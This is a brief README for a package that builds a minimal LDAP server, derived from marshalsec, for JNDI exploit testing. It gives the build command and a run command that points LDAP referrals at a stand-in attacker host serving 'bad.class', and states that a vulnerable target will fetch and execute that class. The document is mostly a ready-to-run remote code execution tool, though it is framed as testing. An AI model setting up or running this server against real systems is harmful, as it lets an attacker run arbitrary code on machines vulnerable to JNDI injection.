This is a package that builds the minimal subset of [marshals](https://github.com/mbechler/marshalsec) LDAPServer for JDNI exploit testing.

Build:
mvn package

Run:
java -jar target/ldap-server.jar http://attacker.some.com:1234/#bad <port>

The default port is 1805.
http://attacker.some.com:1234/bad.class should be reachable by the attacked.
If vulnerable, the attacked will execute the class.


